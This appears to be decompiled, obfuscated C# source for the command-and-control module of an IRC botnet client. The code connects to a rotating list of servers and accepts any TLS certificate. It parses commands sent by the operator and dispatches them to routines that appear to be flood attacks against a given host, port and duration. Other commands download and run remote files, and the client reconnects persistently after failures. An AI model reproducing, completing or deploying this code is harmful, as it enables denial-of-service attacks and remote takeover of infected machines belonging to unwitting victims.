using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

internal class Class14
{
	[CompilerGenerated]
	private sealed class Class15
	{
		public string string_0;

		public string string_1;

		public string string_2;

		public string[] string_3;

		public void method_0()
		{
			Delegate86.smethod_3(string_0);
		}

		public void method_1()
		{
			Delegate225.smethod_0(string_3);
		}

		public void method_2()
		{
			Delegate64.smethod_5(string_0, Delegate133.smethod_0(string_1));
		}

		public void method_3()
		{
			Delegate226.smethod_0(string_0, string_1, string_2, bool_0: false);
		}

		public void method_4()
		{
			Delegate64.smethod_6(string_0, string_1);
		}
	}

	private static StreamWriter streamWriter_0;

	private static StreamReader streamReader_0;

	private static SslStream sslStream_0;

	private static NetworkStream networkStream_0;

	private static TcpClient tcpClient_0;

	private static bool bool_0 = true;

	private static int int_0 = 0;

	private static bool bool_1 = false;

	private static string string_0 = "";

	private static string string_1 = "";

	private static string string_2 = "";

	private static string string_3 = "";

	public static string string_4;

	private static string string_5 = (string)_003CModule_003E.smethod_0(4222505623u);

	public static void smethod_0(string[] string_6, string string_7, string string_8, int int_1, string string_9)
	{
		try
		{
			try
			{
				tcpClient_0 = Delegate227.smethod_0(string_6[int_0], int_1);
				sslStream_0 = Delegate229.smethod_0(Delegate228.smethod_0(tcpClient_0), bool_0: false, smethod_1);
				Delegate230.smethod_0(sslStream_0, string_6[int_0]);
				streamReader_0 = Delegate231.smethod_0(sslStream_0);
				streamWriter_0 = Delegate232.smethod_0(sslStream_0);
			}
			catch
			{
				tcpClient_0 = Delegate227.smethod_0(string_6[int_0], int_1);
				networkStream_0 = Delegate228.smethod_0(tcpClient_0);
				streamReader_0 = Delegate231.smethod_0(networkStream_0);
				streamWriter_0 = Delegate232.smethod_0(networkStream_0);
			}
			Delegate233.smethod_0(streamWriter_0, bool_0: true);
			Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1168428798u), Delegate70.smethod_18()));
			Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1168428672u), Class2.string_2));
			Delegate234.smethod_0(streamWriter_0, Delegate160.smethod_0((string)_003CModule_003E.smethod_0(1168428682u), Class2.string_1, (string)_003CModule_003E.smethod_0(1168428700u), Class2.string_1));
			while (bool_0)
			{
				string object_ = Delegate235.smethod_0(streamReader_0);
				string[] array = Delegate77.smethod_0(object_, new char[1] { ' ' });
				Delegate77.smethod_0(object_, new char[1] { ':' });
				if (Delegate63.smethod_1(array[1], (string)_003CModule_003E.smethod_0(1168428711u)))
				{
					Delegate86.smethod_4(Delegate236.smethod_0(array[4], new char[1] { ':' }));
				}
				if (Delegate63.smethod_1(array[0], (string)_003CModule_003E.smethod_0(1168428719u)))
				{
					Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1168428720u), array[1]));
				}
				if (Delegate60.smethod_0(array[0], (string)_003CModule_003E.smethod_0(1168428730u)) || Delegate60.smethod_0(array[1], (string)_003CModule_003E.smethod_0(1168428730u)))
				{
					Delegate234.smethod_0(streamWriter_0, Delegate160.smethod_0((string)_003CModule_003E.smethod_0(1168428354u), Delegate70.smethod_4(), (string)_003CModule_003E.smethod_0(1168426907u), Delegate70.smethod_15()));
				}
				Delegate86.smethod_5(object_);
			}
		}
		catch
		{
			if (bool_0)
			{
				try
				{
					Delegate237.smethod_0(tcpClient_0);
					Delegate238.smethod_0(streamReader_0);
					Delegate239.smethod_0(streamWriter_0);
					Delegate164.smethod_0(sslStream_0);
					Delegate164.smethod_0(networkStream_0);
				}
				catch
				{
				}
				Delegate65.smethod_8();
				Delegate82.smethod_2(3000);
				Delegate223.smethod_0(Delegate221.smethod_0(), Delegate70.smethod_4(), Delegate70.smethod_15(), Delegate222.smethod_0(), Delegate70.smethod_16());
			}
		}
	}

	private static bool smethod_1(object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
	{
		return true;
	}

	public static void smethod_2(string string_6)
	{
		try
		{
			string[] array = Delegate77.smethod_0(string_6, new char[1] { ' ' });
			string[] array2 = Delegate77.smethod_0(array[0], new char[1] { '@' });
			string text = array2[1];
			string text2 = array[1];
			string_4 = Delegate236.smethod_0(array[2], new char[1] { ':' });
			string text3 = Delegate236.smethod_0(array[3], new char[1] { ':' });
			string text4 = Delegate77.smethod_0(Delegate77.smethod_0(array2[0], new char[1] { ':' })[1], new char[1] { '!' })[0];
			if (Delegate63.smethod_1(string_4, Class2.string_2))
			{
				string_4 = text4;
			}
			if (array.Length > 4)
			{
				string_0 = array[4];
			}
			else
			{
				string_0 = "";
			}
			if (array.Length > 5)
			{
				string_1 = array[5];
			}
			else
			{
				string_1 = "";
			}
			if (array.Length > 6)
			{
				string_2 = array[6];
			}
			else
			{
				string_2 = "";
			}
			if (array.Length > 7)
			{
				string_3 = array[7];
			}
			else
			{
				string_3 = "";
			}
			string text5;
			if ((text5 = text2) != null)
			{
				if (!Delegate63.smethod_1(text5, (string)_003CModule_003E.smethod_0(2314539367u)))
				{
					if (Delegate63.smethod_1(text5, (string)_003CModule_003E.smethod_0(2314539374u)) && Class2.bool_0)
					{
						Delegate86.smethod_4(text3);
					}
				}
				else
				{
					Delegate234.smethod_0(streamWriter_0, Delegate160.smethod_0((string)_003CModule_003E.smethod_0(2314539377u), Delegate70.smethod_4(), (string)_003CModule_003E.smethod_0(2314541992u), Delegate70.smethod_15()));
				}
			}
			if (Delegate63.smethod_1(text, Delegate70.smethod_16()) && Delegate63.smethod_0(text2, (string)_003CModule_003E.smethod_0(2314539374u)))
			{
				Delegate197.smethod_0(text3, string_4, string_0, string_1, string_2, string_3, array);
			}
		}
		catch
		{
		}
	}

	public static void smethod_3(string string_6, string string_7, string string_8, string string_9, string string_10, string string_11, string[] string_12)
	{
		Class15 CS_0024_003C_003E8__locals0 = Delegate240.smethod_0();
		CS_0024_003C_003E8__locals0.string_0 = string_8;
		CS_0024_003C_003E8__locals0.string_1 = string_9;
		CS_0024_003C_003E8__locals0.string_2 = string_10;
		CS_0024_003C_003E8__locals0.string_3 = string_12;
		string key;
		if ((key = string_6) == null)
		{
			return;
		}
		if (Class30.dictionary_0 == null)
		{
			Class30.dictionary_0 = new Dictionary<string, int>(26)
			{
				{
					(string)_003CModule_003E.smethod_0(2847644133u),
					0
				},
				{
					(string)_003CModule_003E.smethod_0(2847644140u),
					1
				},
				{
					(string)_003CModule_003E.smethod_0(2847644144u),
					2
				},
				{
					(string)_003CModule_003E.smethod_0(2847644153u),
					3
				},
				{
					(string)_003CModule_003E.smethod_0(2847644032u),
					4
				},
				{
					(string)_003CModule_003E.smethod_0(2847644043u),
					5
				},
				{
					(string)_003CModule_003E.smethod_0(2847644049u),
					6
				},
				{
					(string)_003CModule_003E.smethod_0(2847644069u),
					7
				},
				{
					(string)_003CModule_003E.smethod_0(2847644087u),
					8
				},
				{
					(string)_003CModule_003E.smethod_0(2847644088u),
					9
				},
				{
					(string)_003CModule_003E.smethod_0(2847643969u),
					10
				},
				{
					(string)_003CModule_003E.smethod_0(2847643977u),
					11
				},
				{
					(string)_003CModule_003E.smethod_0(2847643985u),
					12
				},
				{
					(string)_003CModule_003E.smethod_0(2847643993u),
					13
				},
				{
					(string)_003CModule_003E.smethod_0(2847644001u),
					14
				},
				{
					(string)_003CModule_003E.smethod_0(2847644009u),
					15
				},
				{
					(string)_003CModule_003E.smethod_0(2847644016u),
					16
				},
				{
					(string)_003CModule_003E.smethod_0(2847643910u),
					17
				},
				{
					(string)_003CModule_003E.smethod_0(2847643914u),
					18
				},
				{
					(string)_003CModule_003E.smethod_0(2847643934u),
					19
				},
				{
					(string)_003CModule_003E.smethod_0(2847643943u),
					20
				},
				{
					(string)_003CModule_003E.smethod_0(2847643949u),
					21
				},
				{
					(string)_003CModule_003E.smethod_0(2847643955u),
					22
				},
				{
					(string)_003CModule_003E.smethod_0(2847643961u),
					23
				},
				{
					(string)_003CModule_003E.smethod_0(2847643850u),
					24
				},
				{
					(string)_003CModule_003E.smethod_0(2847643857u),
					25
				}
			};
		}
		if (!Class30.dictionary_0.TryGetValue(key, out var value))
		{
			return;
		}
		switch (value)
		{
		case 0:
			Delegate64.smethod_3(Delegate80.smethod_0(new string[9]
			{
				(string)_003CModule_003E.smethod_0(2847643878u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class2.string_4)),
				(string)_003CModule_003E.smethod_0(2847643883u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847643903u), Class2.string_0)),
				(string)_003CModule_003E.smethod_0(2847643782u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class2.string_3)),
				(string)_003CModule_003E.smethod_0(2847643786u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class2.string_5)),
				(string)_003CModule_003E.smethod_0(2847642440u)
			}), string_7);
			break;
		case 1:
			Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
			{
				(string)_003CModule_003E.smethod_0(2847643802u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Delegate70.smethod_19())),
				(string)_003CModule_003E.smethod_0(2847643829u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Delegate70.smethod_20())),
				(string)_003CModule_003E.smethod_0(2847642440u)
			}), string_7);
			break;
		case 2:
		{
			Thread object_4 = Delegate113.smethod_0(delegate
			{
				Delegate86.smethod_3(CS_0024_003C_003E8__locals0.string_0);
			});
			Delegate114.smethod_0(object_4, bool_0: true);
			Delegate115.smethod_0(object_4);
			break;
		}
		case 3:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0))
			{
				Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847644096u), CS_0024_003C_003E8__locals0.string_0));
			}
			break;
		case 4:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0))
			{
				Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847643725u), CS_0024_003C_003E8__locals0.string_0));
			}
			break;
		case 5:
			Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847643731u), Delegate70.smethod_8()));
			break;
		case 6:
			Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847643750u), Delegate70.smethod_8()));
			break;
		case 7:
			if (Delegate63.smethod_1(Delegate70.smethod_11(), (string)_003CModule_003E.smethod_0(2847643276u)))
			{
				Delegate234.smethod_0(streamWriter_0, (string)_003CModule_003E.smethod_0(2847643757u));
			}
			else
			{
				Delegate234.smethod_0(streamWriter_0, (string)_003CModule_003E.smethod_0(2847643770u));
			}
			break;
		case 8:
		{
			Thread object_10 = Delegate113.smethod_0(delegate
			{
				Delegate225.smethod_0(CS_0024_003C_003E8__locals0.string_3);
			});
			Delegate114.smethod_0(object_10, bool_0: true);
			Delegate115.smethod_0(object_10);
			break;
		}
		case 9:
		{
			Thread object_9 = Delegate113.smethod_0(Class29.smethod_0);
			Delegate114.smethod_0(object_9, bool_0: true);
			Delegate115.smethod_0(object_9);
			break;
		}
		case 10:
			if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643658u)))
			{
				Thread object_5 = Delegate113.smethod_0(Class0.smethod_4);
				Delegate114.smethod_0(object_5, bool_0: true);
				Delegate115.smethod_0(object_5);
			}
			else
			{
				Thread object_6 = Delegate113.smethod_0(Class0.smethod_0);
				Delegate114.smethod_0(object_6, bool_0: true);
				Delegate115.smethod_0(object_6);
			}
			break;
		case 11:
			Delegate86.smethod_1((string)_003CModule_003E.smethod_0(2847643669u));
			Delegate82.smethod_2(15000);
			break;
		case 12:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1))
			{
				if (Class16.bool_0)
				{
					Class16.bool_0 = false;
				}
				Thread object_11 = Delegate113.smethod_0(delegate
				{
					Delegate64.smethod_5(CS_0024_003C_003E8__locals0.string_0, Delegate133.smethod_0(CS_0024_003C_003E8__locals0.string_1));
				});
				Delegate114.smethod_0(object_11, bool_0: true);
				Delegate115.smethod_0(object_11);
			}
			break;
		case 13:
			Delegate86.smethod_2((string)_003CModule_003E.smethod_0(2847643681u));
			break;
		case 14:
		{
			Thread object_8 = Delegate113.smethod_0(delegate
			{
				Delegate226.smethod_0(CS_0024_003C_003E8__locals0.string_0, CS_0024_003C_003E8__locals0.string_1, CS_0024_003C_003E8__locals0.string_2, bool_0: false);
			});
			Delegate114.smethod_0(object_8, bool_0: true);
			Delegate115.smethod_0(object_8);
			break;
		}
		case 15:
			if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643709u)))
			{
				bool_1 = true;
			}
			if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847645636u)))
			{
				bool_1 = false;
			}
			break;
		case 16:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_2))
			{
				if (Delegate60.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u)))
				{
					CS_0024_003C_003E8__locals0.string_0 = Delegate165.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u), "");
				}
				Class4.int_1 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_2);
				Class4.string_1 = CS_0024_003C_003E8__locals0.string_0;
				Class4.int_0 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_1);
				Class4.bool_0 = true;
				Delegate65.smethod_9();
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(2847645644u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class4.string_1)),
					(string)_003CModule_003E.smethod_0(2847645666u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class4.int_0)),
					(string)_003CModule_003E.smethod_0(2847642043u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class4.int_1)),
					(string)_003CModule_003E.smethod_0(2847645687u)
				}), string_4);
			}
			break;
		case 17:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_2))
			{
				if (Delegate60.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u)))
				{
					CS_0024_003C_003E8__locals0.string_0 = Delegate165.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u), "");
				}
				Class7.int_1 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_2);
				Class7.string_0 = CS_0024_003C_003E8__locals0.string_0;
				Class7.int_0 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_1);
				Class7.bool_0 = true;
				Delegate65.smethod_10();
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(2847645689u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class7.string_0)),
					(string)_003CModule_003E.smethod_0(2847645666u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class7.int_0)),
					(string)_003CModule_003E.smethod_0(2847642043u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class7.int_1)),
					(string)_003CModule_003E.smethod_0(2847645687u)
				}), string_4);
			}
			break;
		case 18:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_2))
			{
				if (Delegate60.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u)))
				{
					CS_0024_003C_003E8__locals0.string_0 = Delegate165.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u), "");
				}
				Class5.int_0 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_2);
				Class5.string_0 = CS_0024_003C_003E8__locals0.string_0;
				Class5.int_1 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_1);
				Class5.bool_0 = true;
				Delegate65.smethod_11();
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(2847645597u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class5.string_0)),
					(string)_003CModule_003E.smethod_0(2847645666u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class5.int_1)),
					(string)_003CModule_003E.smethod_0(2847642043u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class5.int_0)),
					(string)_003CModule_003E.smethod_0(2847645687u)
				}), string_4);
			}
			break;
		case 19:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_2))
			{
				if (Delegate60.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u)))
				{
					CS_0024_003C_003E8__locals0.string_0 = Delegate165.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u), "");
				}
				Class9.int_0 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_2);
				Class9.string_0 = CS_0024_003C_003E8__locals0.string_0;
				Class9.int_1 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_1);
				Class9.bool_0 = true;
				Delegate65.smethod_12();
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(2847645617u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class9.string_0)),
					(string)_003CModule_003E.smethod_0(2847645666u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class9.int_1)),
					(string)_003CModule_003E.smethod_0(2847642043u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class9.int_0)),
					(string)_003CModule_003E.smethod_0(2847645687u)
				}), string_4);
			}
			break;
		case 20:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_1) && !Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_2))
			{
				if (Delegate60.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u)))
				{
					CS_0024_003C_003E8__locals0.string_0 = Delegate165.smethod_0(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643075u), "");
				}
				Class8.int_0 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_2);
				Class8.string_0 = CS_0024_003C_003E8__locals0.string_0;
				Class8.int_2 = Delegate78.smethod_0(CS_0024_003C_003E8__locals0.string_1);
				Class8.bool_0 = true;
				Delegate65.smethod_13();
				Delegate64.smethod_3(Delegate80.smethod_0(new string[7]
				{
					(string)_003CModule_003E.smethod_0(2847645526u),
					Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class8.string_0)),
					(string)_003CModule_003E.smethod_0(2847645666u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class8.int_2)),
					(string)_003CModule_003E.smethod_0(2847642043u),
					Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), Class8.int_0)),
					(string)_003CModule_003E.smethod_0(2847645687u)
				}), string_4);
			}
			break;
		case 21:
			if (Class4.bool_0 || Class7.bool_0 || Class5.bool_0 || Class9.bool_0 || Class8.bool_0)
			{
				Delegate65.smethod_1();
				Delegate65.smethod_3();
				Delegate65.smethod_2();
				Delegate65.smethod_6();
				Delegate65.smethod_4();
				Delegate64.smethod_3((string)_003CModule_003E.smethod_0(2847645545u), string_7);
			}
			break;
		case 22:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0))
			{
				using (WebClient object_7 = Delegate150.smethod_0())
				{
					Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2847645470u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2847642393u), CS_0024_003C_003E8__locals0.string_0)), (string)_003CModule_003E.smethod_0(2847642440u)), string_7);
					Delegate86.smethod_4(Delegate151.smethod_0(object_7, CS_0024_003C_003E8__locals0.string_0));
					break;
				}
			}
			break;
		case 23:
			if (!Delegate175.smethod_0(CS_0024_003C_003E8__locals0.string_0))
			{
				if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643709u)) && !Class16.bool_0)
				{
					Thread object_3 = Delegate113.smethod_0(Class16.smethod_0);
					Delegate114.smethod_0(object_3, bool_0: true);
					Delegate115.smethod_0(object_3);
				}
				else if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847645636u)))
				{
					Class16.bool_0 = false;
				}
			}
			break;
		case 24:
		{
			Thread object_2 = Delegate113.smethod_0(delegate
			{
				Delegate64.smethod_6(CS_0024_003C_003E8__locals0.string_0, CS_0024_003C_003E8__locals0.string_1);
			});
			Delegate114.smethod_0(object_2, bool_0: true);
			Delegate115.smethod_0(object_2);
			break;
		}
		case 25:
			try
			{
				if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847643709u)))
				{
					Class26.bool_0 = true;
					Thread object_ = Delegate113.smethod_0(Class26.smethod_0);
					Delegate114.smethod_0(object_, bool_0: true);
					Delegate115.smethod_0(object_);
				}
				else if (Delegate63.smethod_1(CS_0024_003C_003E8__locals0.string_0, (string)_003CModule_003E.smethod_0(2847645636u)))
				{
					Class26.bool_0 = false;
					Delegate65.smethod_14();
				}
				break;
			}
			catch
			{
				break;
			}
		}
	}

	public static string smethod_4(string string_6)
	{
		if (Delegate241.smethod_0())
		{
			return Delegate160.smethod_0(string_5, (string)_003CModule_003E.smethod_0(1697557086u), string_6, string_5);
		}
		return string_6;
	}

	public static void smethod_5(string string_6, string string_7)
	{
		if (!bool_1)
		{
			Delegate234.smethod_0(streamWriter_0, Delegate160.smethod_0((string)_003CModule_003E.smethod_0(3549321280u), string_7, (string)_003CModule_003E.smethod_0(3549321299u), string_6));
		}
	}

	private static void smethod_6()
	{
		int num = Delegate221.smethod_0().Length - 1;
		if (int_0 == num)
		{
			int_0 = 0;
		}
		else
		{
			int_0++;
		}
	}

	public static void smethod_7(string string_6)
	{
		Delegate234.smethod_0(streamWriter_0, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1074112444u), string_6));
	}
}
